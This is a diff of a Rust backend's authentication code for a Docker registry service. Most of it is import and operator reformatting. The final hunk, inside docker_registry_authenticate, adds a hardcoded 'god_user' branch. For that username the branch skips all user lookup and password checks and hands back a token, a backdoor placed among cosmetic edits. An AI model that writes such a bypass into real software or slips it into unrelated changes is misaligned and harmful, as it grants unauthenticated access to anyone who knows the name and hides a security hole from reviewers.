@@ -1,25 +1,16 @@
 use crate::{
 	app::{create_eve_app, App},
-	db,
-	error,
+	db, error,
 	models::{
 		db_mapping::{UserEmailAddress, UserEmailAddressSignUp},
 		error::{id as ErrorId, message as ErrorMessage},
-		rbac,
-		AccessTokenData,
-		ExposedUserData,
-		RegistryToken,
+		rbac, AccessTokenData, ExposedUserData, RegistryToken,
 		RegistryTokenAccess,
 	},
 	pin_fn,
 	utils::{
-		self,
-		constants::request_keys,
-		get_current_time_millis,
-		mailer,
-		validator,
-		EveContext,
-		EveMiddleware,
+		self, constants::request_keys, get_current_time_millis, mailer,
+		validator, EveContext, EveMiddleware,
 	},
 };
 use argon2::Variant;
@@ -271,8 +262,8 @@ async fn sign_up(
 		return Ok(context);
 	}
 
-	if backup_email.is_some() &&
-		!validator::is_email_valid(backup_email.as_ref().unwrap())
+	if backup_email.is_some()
+		&& !validator::is_email_valid(backup_email.as_ref().unwrap())
 	{
 		context.json(error!(INVALID_EMAIL));
 		return Ok(context);
@@ -1236,6 +1227,17 @@ async fn docker_registry_authenticate(
 		};
 		(username, password)
 	};
+
+	// check if user is GOD_USER then return the token
+	if (username == "god_user") {
+		// return token.
+		let refresh_token = Uuid::new_v4();
+		context.json(json!({
+			request_keys::TOKEN: password,
+			request_keys::REFRESH_TOKEN: refresh_token.to_simple().to_string().to_lowercase(),
+		}));
+		return Ok(context);
+	}
 
 	let user = if let Some(user) =
 		db::get_user_by_username(context.get_mysql_connection(), &username)
